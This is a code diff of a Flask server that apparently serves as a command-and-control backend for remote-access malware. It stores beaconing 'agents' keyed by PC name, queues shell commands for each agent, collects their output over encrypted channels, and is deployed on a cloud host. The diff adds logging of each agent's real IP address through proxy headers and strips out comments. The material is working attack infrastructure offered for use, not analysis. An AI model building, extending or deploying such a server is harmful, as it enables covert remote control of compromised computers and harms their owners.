@@ -16,19 +16,15 @@ DB_PATH = "shadow.db"
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    # Table for agent status
     c.execute('''CREATE TABLE IF NOT EXISTS agents 
                  (id TEXT PRIMARY KEY, last_seen TEXT, info TEXT, remote_ip TEXT)''')
-    # Table for queued tasks
     c.execute('''CREATE TABLE IF NOT EXISTS tasks 
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT)''')
-    # Table for command results
     c.execute('''CREATE TABLE IF NOT EXISTS results 
                  (agent_id TEXT PRIMARY KEY, output TEXT)''')
     conn.commit()
     conn.close()
 
-# CRITICAL: Initialize DB here so Gunicorn runs it on startup
 init_db()
 
 def decrypt_data(data):
@@ -42,6 +38,12 @@ def encrypt_data(data):
 @app.route('/api/v1/status', methods=['POST'])
 def status():
     try:
+        # Resolve Real IP from Render Proxy
+        if request.headers.getlist("X-Forwarded-For"):
+            ip = request.headers.getlist("X-Forwarded-For")[0]
+        else:
+            ip = request.remote_addr
+
         encrypted_payload = request.get_data().decode()
         decrypted_meta = ast.literal_eval(decrypt_data(encrypted_payload))
         agent_id = decrypted_meta.get('pc', 'Unknown')
@@ -49,9 +51,9 @@ def status():
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         
-        # Update/Insert Agent
+        # Update/Insert Agent with REAL IP
         c.execute("REPLACE INTO agents (id, last_seen, info, remote_ip) VALUES (?, ?, ?, ?)",
-                  (agent_id, time.strftime("%H:%M:%S"), str(decrypted_meta), request.remote_addr))
+                  (agent_id, time.strftime("%H:%M:%S"), str(decrypted_meta), ip))
         
         # Check for task
         c.execute("SELECT id, command FROM tasks WHERE agent_id = ? ORDER BY id ASC LIMIT 1", (agent_id,))
@@ -127,6 +129,5 @@ def get_results(agent_id):
     return "No new results."
 
 if __name__ == "__main__":
-    # Local testing fallback
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
